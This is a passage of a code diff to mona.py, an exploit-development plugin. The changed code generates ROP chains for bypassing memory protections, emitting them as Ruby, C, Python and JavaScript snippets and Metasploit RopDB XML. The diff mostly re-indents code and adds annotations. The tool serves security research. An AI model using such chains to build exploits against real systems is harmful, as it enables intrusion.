+				if str(thistarget) == "nop":
+					thischain[thisreg] = putValueInReg(thisreg,0x90909090,"nop",suggestions,interestinggadgets,criteria)
 
-        regimpact = {}
-        # create the current chain
-        ropdbchain = ""
-        tohex_array = []
-        for step in regsequences:
-            thisreg = step
-            if thisreg in thischain:
-                for gadget in thischain[thisreg]:
-                    gadgetstep = gadget[0]
-                    steptxt = gadget[1]
-                    junksize = 0
-                    showfills = False
-                    if len(gadget) > 2:
-                        junksize = gadget[2]
-                    if gadgetstep in interestinggadgets and steptxt == "":
-                        thisinstr = interestinggadgets[gadgetstep].lstrip()
-                        if thisinstr.startswith("#"):
-                            thisinstr = thisinstr[2:len(thisinstr)]
-                            showfills = True
-                        thismodname = MnPointer(gadgetstep).belongsTo()
-                        thisinstr += " [" + thismodname + "]"
-                        tmod = MnModule(thismodname)
-                        if not thismodname in modused:
-                            modused[thismodname] = [tmod.moduleBase,tmod.__str__()] 
-                        modprefix = "base_" + sanitize_module_name(thismodname)
-                        if showrva:
-                            alignsize = longestmod - len(sanitize_module_name(thismodname))
-                            vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
-                            thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
-                        else:
-                            vplogtxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
-                            thischaintxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
-                        ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),thisinstr.strip(" "))
-                        tohex_array.append(gadgetstep)
-                        
-                        if showfills:
-                            vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-                            thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-                            if returnoffset > 0:
-                                ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
-                            returnoffset = getOffset(interestinggadgets[gadgetstep])
-                            if delayedfill > 0:
-                                vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
-                                thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
-                                ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
-                                delayedfill = 0
-                            if thisinstr.startswith("POP "):
-                                delayedfill = junksize
-                            else:
-                                vplogtxt += createJunk(junksize,"Filler (compensate)",fillersize)
-                                thischaintxt += createJunk(junksize,"Filler (compensate)",fillersize)
-                                if junksize > 0:
-                                    ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
-                    else:
-                        # still could be a pointer
-                        thismodname = MnPointer(gadgetstep).belongsTo()
-                        if thismodname != "":
-                            tmod = MnModule(thismodname)
-                            if not thismodname in modused:
-                                modused[thismodname] = [tmod.moduleBase,tmod.__str__()]
-                            modprefix = "base_" + sanitize_module_name(thismodname)
-                            if showrva:
-                                alignsize = longestmod - len(sanitize_module_name(thismodname))
-                                vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
-                                thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
-                            else:
-                                vplogtxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)     
-                                thischaintxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)
-                            ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),steptxt.strip(" "))
-                        else:                       
-                            vplogtxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)
-                            thischaintxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)                     
-                            ropdbchain += '    <gadget value="0x%s">%s</gadget>\n' % (toHex(gadgetstep),steptxt.strip(" "))
-                        
-                        if steptxt.startswith("[-]"):
-                            vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-                            thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-                            ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
-                            returnoffset = 0
-                        if delayedfill > 0:
-                            vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
-                            thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
-                            ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
-                            delayedfill = 0                         
-                        vplogtxt += createJunk(junksize,"",fillersize)
-                        thischaintxt += createJunk(junksize,"",fillersize)
-                        if fillersize > 0:
-                            ropdbchain += '    <gadget value="junk">Filler</gadget>\n'                      
-        # finish it off
-        steptxt = ""
-        if "pushad" in suggestions:
-            shortest_pushad = getShortestGadget(suggestions["pushad"])
-            junksize = getJunk(interestinggadgets[shortest_pushad])
-            thisinstr = interestinggadgets[shortest_pushad].lstrip()
-            if thisinstr.startswith("#"):
-                thisinstr = thisinstr[2:len(thisinstr)]
-            regimpact = getRegImpact(thisinstr)
-            thismodname = MnPointer(shortest_pushad).belongsTo()
-            thisinstr += " [" + thismodname + "]"
-            tmod = MnModule(thismodname)
-            if not thismodname in modused:
-                modused[thismodname] = [tmod.moduleBase,tmod.__str__()]             
-            modprefix = "base_" + sanitize_module_name(thismodname)
-            if showrva:
-                alignsize = longestmod - len(thismodname)
-                vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
-                thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
-            else:
-                vplogtxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
-                thischaintxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
-            ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(shortest_pushad-tmod.moduleBase),thisinstr.strip(" "))
-            vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-            thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-            if fillersize > 0:
-                ropdbchain += '    <gadget value="junk">Filler</gadget>\n'                      
-            vplogtxt += createJunk(junksize,"",fillersize)
-            thischaintxt += createJunk(junksize,"",fillersize)
-            if fillersize > 0:
-                ropdbchain += '    <gadget value="junk">Filler</gadget>\n'                      
-            
-        else:
-            vplogtxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
-            thischaintxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
-            ropdbchain += '    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>\n'
-            vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-            thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
-            if returnoffset > 0:
-                ropdbchain += '    <gadget value="junk">Filler</gadget>\n'  
-        
-        # anything else to add ?
-        if len(toadd) > 0:
-            for adds in toadd:
-                theptr = toadd[adds][0]
-                freetext = toadd[adds][1]
-                if theptr > 0:
-                    thismodname = MnPointer(theptr).belongsTo()
-                    freetext += " [" + thismodname + "]"
-                    tmod = MnModule(thismodname)
-                    if not thismodname in modused:
-                        modused[thismodname] = [tmod.moduleBase,tmod.__str__()]             
-                    modprefix = "base_" + sanitize_module_name(thismodname)
-                    if showrva:
-                        alignsize = longestmod - len(thismodname)
-                        vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
-                        thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
-                    else:
-                        vplogtxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
-                        thischaintxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
-                    ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(theptr-tmod.moduleBase),freetext.strip(" "))
-                else:
-                    vplogtxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
-                    thischaintxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
-                    ropdbchain += '    <gadget offset="0x%s">Unable to find %s</gadget>\n' % (toHex(theptr),freetext.strip(" "))
-        
-        vplogtxt += '    ].flatten.pack("V*")\n'
-        vplogtxt += '\n    return rop_gadgets\n\n'
-        vplogtxt += '  end\n'
-        vplogtxt += '\n\n  # Call the ROP chain generator inside the \'exploit\' function :\n\n'
-        calltxt = "rop_chain = create_rop_chain("
-        argtxt = ""
-        vplogtxtpy = ""
-        vplogtxtc = ""
-        vplogtxtjs = ""
-        argtxtpy = ""
-        if showrva:
-            for themod in modused:
-                repr_mod = sanitize_module_name(themod)
-                vplogtxt += "  # " + modused[themod][1] + "\n"
-                vplogtxtpy += "  # " + modused[themod][1] + "\n"
-                vplogtxtc += "  // " + modused[themod][1] + "\n"
-                vplogtxtjs += "  // " + modused[themod][1] + "\n"
-                vplogtxt += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
-                vplogtxtjs += "  var base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
-                vplogtxtpy += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
-                vplogtxtc += "  unsigned int base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
-                calltxt += "base_" + repr_mod + ","
-                argtxt += "base_" + repr_mod + ","
-                argtxtpy += "base_" + repr_mod + ","                
-        calltxt = calltxt.rstrip(",") + ")\n"
-        argtxt = argtxt.strip(",")
-        argtxtpy = argtxtpy.strip(",")
-        argtxtjs = argtxtpy.replace(".","")
-        
-        vplogtxt = vplogtxt.replace("create_rop_chain()","create_rop_chain(" + argtxt + ")")
-        vplogtxt += '\n  ' + calltxt
-        vplogtxt += '\n\n\n'
-        # C
-        vplogtxt += "*** [ C ] ***\n\n"
-        vplogtxt += "  #define CREATE_ROP_CHAIN(name, ...) \\\n"
-        vplogtxt += "    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \\\n"
-        vplogtxt += "    unsigned int name[name##_length / sizeof(unsigned int)]; \\\n"
-        vplogtxt += "    create_rop_chain(name, ##__VA_ARGS__);\n\n"
-        vplogtxt += "  int create_rop_chain(unsigned int *buf, %s)\n" % ", ".join("unsigned int %s" % _ for _ in argtxt.split(","))
-        vplogtxt += "  {\n"
-        vplogtxt += "    // rop chain generated with mona.py - www.corelan.be\n"            
-        vplogtxt += "    unsigned int rop_gadgets[] = {\n"
-        vplogtxt += thischaintxt.replace("#", "//")
-        vplogtxt += "    };\n"
-        vplogtxt += "    if(buf != NULL) {\n"
-        vplogtxt += "      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));\n"
-        vplogtxt += "    };\n"
-        vplogtxt += "    return sizeof(rop_gadgets);\n"
-        vplogtxt += "  }\n\n"
-        vplogtxt += vplogtxtc
-        vplogtxt += "  // use the 'rop_chain' variable after this call, it's just an unsigned int[]\n"
-        vplogtxt += "  CREATE_ROP_CHAIN(rop_chain, %s);\n" % argtxtpy
-        vplogtxt += "  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:\n"
-        vplogtxt += "  // unsigned int rop_chain[256];\n"
-        vplogtxt += "  // int rop_chain_length = create_rop_chain(rop_chain, %s);\n\n" % argtxtpy
-        # Python
-        vplogtxt += "*** [ Python ] ***\n\n"        
-        vplogtxt += "  def create_rop_chain(%s):\n" % argtxt
-        vplogtxt += "\n    # rop chain generated with mona.py - www.corelan.be\n"           
-        vplogtxt += "    rop_gadgets = [\n"
-        vplogtxt += thischaintxt
-        vplogtxt += "    ]\n"
-        vplogtxt += "    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)\n\n"
-        vplogtxt += vplogtxtpy
-        vplogtxt += "  rop_chain = create_rop_chain(%s)\n\n" % argtxtpy
-        # Javascript
-        vplogtxt += "\n\n*** [ JavaScript ] ***\n\n"
-        vplogtxt += "  //rop chain generated with mona.py - www.corelan.be\n"       
-        if not showrva:
-            vplogtxt += "  rop_gadgets = unescape(\n"
-            allptr = thischaintxt.split("\n")
-            tptrcnt = 0
-            for tptr in allptr:
-                comments = tptr.split(",")
-                comment = ""
-                if len(comments) > 1:
-                    # add everything
-                    ic = 1
-                    while ic < len(comments):
-                        comment += "," + comments[ic]
-                        ic += 1
-                tptrcnt += 1
-                comment = comment.replace("  ","")
-                if tptrcnt < len(allptr):
-                    vplogtxt += "    \"" + toJavaScript(tptr) + "\" + // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n"
-                else:
-                    vplogtxt += "    \"" + toJavaScript(tptr) + "\"); // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n\n"
-        else:
-            vplogtxt += "  function get_rop_chain(%s) {\n" % argtxtjs
-            vplogtxt += "    var rop_gadgets = [\n"
-            vplogtxt += thischaintxt.replace("  #","  //").replace(".","")
-            vplogtxt += "      ];\n"
-            vplogtxt += "    return rop_gadgets;\n"
-            vplogtxt += "  }\n\n"
-            vplogtxt += "  function gadgets2uni(gadgets) {\n"
-            vplogtxt += "    var uni = \"\";\n"
-            vplogtxt += "    for(var i=0;i<gadgets.length;i++){\n"
-            vplogtxt += "      uni += d2u(gadgets[i]);\n"
-            vplogtxt += "    }\n"
-            vplogtxt += "    return uni;\n"
-            vplogtxt += "  }\n\n"
-            vplogtxt += "  function d2u(dword) {\n"
-            vplogtxt += "    var uni = String.fromCharCode(dword & 0xFFFF);\n"
-            vplogtxt += "    uni += String.fromCharCode(dword>>16);\n"
-            vplogtxt += "    return uni;\n"
-            vplogtxt += "  }\n\n"
-            vplogtxt += "%s" % vplogtxtjs
-            vplogtxt += "\n  var rop_chain = gadgets2uni(get_rop_chain(%s));\n\n" % argtxtjs
-        vplogtxt += '\n--------------------------------------------------------------------------------------------------\n\n'
-        
-        # MSF RopDB XML Format - spit out if only one module was selected
-        if len(modused) == 1:
-            modulename = ""
-            for modname in modused:
-                modulename = modname
-            objMod = MnModule(modulename)
-            modversion = objMod.moduleVersion
-            modbase = objMod.moduleBase
-            ropdb = '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
-            ropdb += "<db>\n<rop>\n"
-            ropdb += "  <compatibility>\n"
-            ropdb += "    <target>%s</target>\n" % modversion
-            ropdb += "  </compatibility>\n\n"
-            ropdb += '  <gadgets base="0x%s">\n' % toHex(modbase)
-            ropdb += ropdbchain.replace('[' + modulename + ']','').replace('&','').replace('[IAT ' + modulename + ']','')
-            ropdb += '  </gadgets>\n'
-            ropdb += '</rop>\n</db>'
-            # write to file if needed
-            shortmodname = modulename.replace(".dll","")
-            ignoremodules = True
-            if ropdbchain.lower().find("virtualprotect") > -1:
-                ofile = MnLog(shortmodname+"_virtualprotect.xml")
-                thisofile = ofile.reset(showheader = False)
-                ofile.write(ropdb,thisofile)
-            if ropdbchain.lower().find("virtualalloc") > -1:
-                ofile = MnLog(shortmodname+"_virtualalloc.xml")
-                thisofile = ofile.reset(showheader = False)
-                ofile.write(ropdb,thisofile)
-            ignoremodules = False
-        
-        #go to the next one
-        
-    vpfile = MnLog("rop_chains.txt")
-    thisvplog = vpfile.reset()
-    vpfile.write(vplogtxt,thisvplog)
-    
-    dbg.log("[+] ROP chains written to file %s" % thisvplog)
-    objprogressfile.write("Done creating rop chains",progressfile)
-    return vplogtxt
+					
+				if str(thistarget).startswith("&?"):
+					#pointer to
+					rwptr = getAPointer(modulestosearch,criteria,"RW")
+					if rwptr == 0:
+						rwptr = getAPointer(modulestosearch,criteria,"W")
+					if rwptr != 0:
+
+						rwmodname = MnPointer(rwptr).belongsTo()
+						
+						rwmodinfo = getGadgetAddressInfo(rwptr)
+						thischain[thisreg] = putValueInReg(thisreg,rwptr,"&Writable location [" + rwmodname+"]" + rwmodinfo,suggestions,interestinggadgets,criteria)
+					else:
+						thischain[thisreg] = putValueInReg(thisreg,rwptr,"[-] Unable to find writable location",suggestions,interestinggadgets,criteria)
+				
+				
+				if str(thistarget).startswith("pop"):
+					#get distance
+					if "pop " + thisreg in suggestions:
+						popptr = getShortestGadget(suggestions["pop "+thisreg])
+						junksize = getJunk(interestinggadgets[popptr])-4
+						thismodname = MnPointer(popptr).belongsTo()
+						tmodinfo = getGadgetAddressInfo(popptr)
+						thischain[thisreg] = [[popptr,"",junksize],[popptr,"skip 4 bytes [" + thismodname + "]" + tmodinfo]]
+					else:
+						thischain[thisreg] = [[0,"[-] Couldn't find a gadget to put a pointer to a stackpivot (4 bytes) into "+ thisreg,0]]
+	
+				
+				if str(thistarget)==("&"):
+					pattern = step[2]
+					base = 0
+					top = TOP_USERLAND
+					type = "ptr"
+					al = criteria["accesslevel"]
+					criteria["accesslevel"] = "R"
+					ptr_counter = 0				
+					ptr_to_get = 2
+					oldsilent = silent
+					silent=True				
+					allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
+					silent = oldsilent
+					criteria["accesslevel"] = al
+					if len(allpointers) > 0:
+						theptr = 0
+						for ptrtype in allpointers:
+							for ptrs in allpointers[ptrtype]:
+								theptr = ptrs
+								break
+						thischain[thisreg] = putValueInReg(thisreg,theptr,"&" + str(pattern) + " [" + MnPointer(theptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
+					else:
+						thischain[thisreg] = putValueInReg(thisreg,0,"[-] Unable to find ptr to " + str(pattern),suggestions,interestinggadgets,criteria)
+						
+		returnoffset = 0
+		delayedfill = 0
+		junksize = 0
+		# get longest modulename
+		longestmod = 0
+		fillersize = 0
+		for step in routinedefs[routine]:
+			thisreg = step[0]
+			if thisreg in thischain:
+				for gadget in thischain[thisreg]:
+					thismodname = sanitize_module_name(MnPointer(gadget[0]).belongsTo())
+					if len(thismodname) > longestmod:
+						longestmod = len(thismodname)
+		if showrva:
+			fillersize = longestmod + 8
+		else:
+			fillersize = 0
+		
+		# modify the chain order (regsequences array)
+		for reg in movetolast:
+			if reg in regsequences:
+				regsequences.remove(reg)
+				regsequences.append(reg)
+		
+
+		regimpact = {}
+		# create the current chain
+		ropdbchain = ""
+		tohex_array = []
+		for step in regsequences:
+			thisreg = step
+			vplogtxt += 	"      #[---INFO:gadgets_to_set_%s:---]\n" % (thisreg) 
+			thischaintxt += "      #[---INFO:gadgets_to_set_%s:---]\n" % (thisreg)
+			if thisreg in thischain:
+				for gadget in thischain[thisreg]:
+					gadgetstep = gadget[0]
+					steptxt = gadget[1]
+					junksize = 0
+					showfills = False
+					if len(gadget) > 2:
+						junksize = gadget[2]
+					if gadgetstep in interestinggadgets and steptxt == "":
+						thisinstr = interestinggadgets[gadgetstep].lstrip()
+						if thisinstr.startswith("#"):
+							thisinstr = thisinstr[2:len(thisinstr)]
+							showfills = True
+						thismodname = MnPointer(gadgetstep).belongsTo()
+						thisinstr += " [" + thismodname + "]"
+						tmod = MnModule(thismodname)
+						thisinstr += getGadgetAddressInfo(gadgetstep)
+						if not thismodname in modused:
+							modused[thismodname] = [tmod.moduleBase,tmod.__str__()]	
+						modprefix = "base_" + sanitize_module_name(thismodname)
+						if showrva:
+							alignsize = longestmod - len(sanitize_module_name(thismodname))
+							vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
+							thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
+						else:
+							vplogtxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
+							thischaintxt += "      0x%s,  # %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
+						ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),thisinstr.strip(" "))
+						tohex_array.append(gadgetstep)
+						
+						if showfills:
+							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+							if returnoffset > 0:
+								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
+							returnoffset = getOffset(interestinggadgets[gadgetstep])
+							if delayedfill > 0:
+								vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
+								thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
+								ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
+								delayedfill = 0
+							if thisinstr.startswith("POP "):
+								delayedfill = junksize
+							else:
+								vplogtxt += createJunk(junksize,"Filler (compensate)",fillersize)
+								thischaintxt += createJunk(junksize,"Filler (compensate)",fillersize)
+								if junksize > 0:
+									ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
+					else:
+						# still could be a pointer
+						thismodname = MnPointer(gadgetstep).belongsTo()
+						if thismodname != "":
+							tmod = MnModule(thismodname)
+							if not thismodname in modused:
+								modused[thismodname] = [tmod.moduleBase,tmod.__str__()]
+							modprefix = "base_" + sanitize_module_name(thismodname)
+							if showrva:
+								alignsize = longestmod - len(sanitize_module_name(thismodname))
+								vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
+								thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
+							else:
+								vplogtxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)		
+								thischaintxt += "      0x%s,  # %s\n" % (toHex(gadgetstep),steptxt)
+							ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(gadgetstep-tmod.moduleBase),steptxt.strip(" "))
+						else:						
+							vplogtxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)
+							thischaintxt += "      0x%s,%s  # %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)						
+							ropdbchain += '    <gadget value="0x%s">%s</gadget>\n' % (toHex(gadgetstep),steptxt.strip(" "))
+						
+						if steptxt.startswith("[-]"):
+							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
+							returnoffset = 0
+						if delayedfill > 0:
+							vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
+							thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
+							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'
+							delayedfill = 0							
+						vplogtxt += createJunk(junksize,"",fillersize)
+						thischaintxt += createJunk(junksize,"",fillersize)
+						if fillersize > 0:
+							ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
+		# finish it off
+		steptxt = ""
+		vplogtxt += 	"      #[---INFO:pushad:---]\n"  
+		thischaintxt += "      #[---INFO:pushad:---]\n"
+		if "pushad" in suggestions:
+			shortest_pushad = getShortestGadget(suggestions["pushad"])
+			junksize = getJunk(interestinggadgets[shortest_pushad])
+			thisinstr = interestinggadgets[shortest_pushad].lstrip()
+			if thisinstr.startswith("#"):
+				thisinstr = thisinstr[2:len(thisinstr)]
+			regimpact = getRegImpact(thisinstr)
+			thismodname = MnPointer(shortest_pushad).belongsTo()
+			thisinstr += " [" + thismodname + "]"
+			tmod = MnModule(thismodname)
+			thisinstr += getGadgetAddressInfo(shortest_pushad)
+			if not thismodname in modused:
+				modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
+			modprefix = "base_" + sanitize_module_name(thismodname)
+			if showrva:
+				alignsize = longestmod - len(thismodname)
+				vplogtxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
+				thischaintxt += "      %s + 0x%s,%s  # %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
+			else:
+				vplogtxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
+				thischaintxt += "      0x%s,  # %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
+			ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(shortest_pushad-tmod.moduleBase),thisinstr.strip(" "))
+			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+			if fillersize > 0:
+				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
+			vplogtxt += createJunk(junksize,"",fillersize)
+			thischaintxt += createJunk(junksize,"",fillersize)
+			if fillersize > 0:
+				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'						
+			
+		else:
+			vplogtxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
+			thischaintxt += "      0x00000000,%s  # %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
+			ropdbchain += '    <gadget offset="0x00000000">Unable to find PUSHAD gadget</gadget>\n'
+			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
+			if returnoffset > 0:
+				ropdbchain += '    <gadget value="junk">Filler</gadget>\n'	
+		
+		# anything else to add ?
+		if len(toadd) > 0:
+			vplogtxt += 	"      #[---INFO:extras:---]\n"  
+			thischaintxt += "      #[---INFO:extras:---]\n"
+			for adds in toadd:
+				theptr = toadd[adds][0]
+				freetext = toadd[adds][1]
+				if theptr > 0:
+					thismodname = MnPointer(theptr).belongsTo()
+					freetext += " [" + thismodname + "]"
+					tmod = MnModule(thismodname)
+					freetext += getGadgetAddressInfo(theptr)
+					if not thismodname in modused:
+						modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
+					modprefix = "base_" + sanitize_module_name(thismodname)
+					if showrva:
+						alignsize = longestmod - len(thismodname)
+						vplogtxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
+						thischaintxt += "      %s + 0x%s,%s  # %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
+					else:
+						vplogtxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
+						thischaintxt += "      0x%s,  # %s\n" % (toHex(theptr),freetext)
+					ropdbchain += '    <gadget offset="0x%s">%s</gadget>\n' % (toHex(theptr-tmod.moduleBase),freetext.strip(" "))
+				else:
+					vplogtxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
+					thischaintxt += "      0x%s,  # <- Unable to find %s\n" % (toHex(theptr),freetext)
+					ropdbchain += '    <gadget offset="0x%s">Unable to find %s</gadget>\n' % (toHex(theptr),freetext.strip(" "))
+		
+		vplogtxt += '    ].flatten.pack("V*")\n'
+		vplogtxt += '\n    return rop_gadgets\n\n'
+		vplogtxt += '  end\n'
+		vplogtxt += '\n\n  # Call the ROP chain generator inside the \'exploit\' function :\n\n'
+		calltxt = "rop_chain = create_rop_chain("
+		argtxt = ""
+		vplogtxtpy = ""
+		vplogtxtc = ""
+		vplogtxtjs = ""
+		argtxtpy = ""
+		if showrva:
+			for themod in modused:
+				repr_mod = sanitize_module_name(themod)
+				vplogtxt += "  # " + modused[themod][1] + "\n"
+				vplogtxtpy += "  # " + modused[themod][1] + "\n"
+				vplogtxtc += "  // " + modused[themod][1] + "\n"
+				vplogtxtjs += "  // " + modused[themod][1] + "\n"
+				vplogtxt += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
+				vplogtxtjs += "  var base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
+				vplogtxtpy += "  base_" + repr_mod + " = 0x%s\n" % toHex(modused[themod][0])
+				vplogtxtc += "  unsigned int base_" + repr_mod + " = 0x%s;\n" % toHex(modused[themod][0])
+				calltxt += "base_" + repr_mod + ","
+				argtxt += "base_" + repr_mod + ","
+				argtxtpy += "base_" + repr_mod + ","				
+		calltxt = calltxt.rstrip(",") + ")\n"
+		argtxt = argtxt.strip(",")
+		argtxtpy = argtxtpy.strip(",")
+		argtxtjs = argtxtpy.replace(".","")
+		
+		vplogtxt = vplogtxt.replace("create_rop_chain()","create_rop_chain(" + argtxt + ")")
+		vplogtxt += '\n  ' + calltxt
+		vplogtxt += '\n\n\n'
+		# C
+		vplogtxt += "*** [ C ] ***\n\n"
+		vplogtxt += "  #define CREATE_ROP_CHAIN(name, ...) \\\n"
+		vplogtxt += "    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \\\n"
+		vplogtxt += "    unsigned int name[name##_length / sizeof(unsigned int)]; \\\n"
+		vplogtxt += "    create_rop_chain(name, ##__VA_ARGS__);\n\n"
+		vplogtxt += "  int create_rop_chain(unsigned int *buf, %s)\n" % ", ".join("unsigned int %s" % _ for _ in argtxt.split(","))
+		vplogtxt += "  {\n"
+		vplogtxt += "    // rop chain generated with mona.py - www.corelan.be\n"			
+		vplogtxt += "    unsigned int rop_gadgets[] = {\n"
+		vplogtxt += thischaintxt.replace("#", "//")
+		vplogtxt += "    };\n"
+		vplogtxt += "    if(buf != NULL) {\n"
+		vplogtxt += "      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));\n"
+		vplogtxt += "    };\n"
+		vplogtxt += "    return sizeof(rop_gadgets);\n"
+		vplogtxt += "  }\n\n"
